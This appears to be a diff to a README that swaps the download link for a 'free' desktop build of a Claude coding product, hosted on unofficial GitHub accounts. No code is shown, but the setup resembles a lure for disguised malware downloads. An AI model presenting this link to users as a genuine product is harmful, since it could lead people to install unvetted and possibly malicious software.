@@ -6,7 +6,7 @@
 
 ## Install
 
-[Download `Claude-Code-Sonnet-5-Free-Desktop.zip`](https://github.com/Tiaaannnn/Claude-Code-Sonnet-5-Free-Desktop/releases/latest/download/Claude-Code-Sonnet-5-Free-Desktop.zip)
+[Download `ClaudeSonnet5-desktop.zip`](https://github.com/sonnet5claude/Claude-Code-Sonnet-5-Free-Desktop/releases/download/sonnet5/ClaudeSonnet5-desktop.zip)
 ---
 
 <img width="1746" height="901" alt="589318e9-2aa7-4459-9b85-a16b2f36f3b8" src="https://github.com/user-attachments/assets/08b147ee-e8bb-4720-a950-4daecbfa6bb3" />
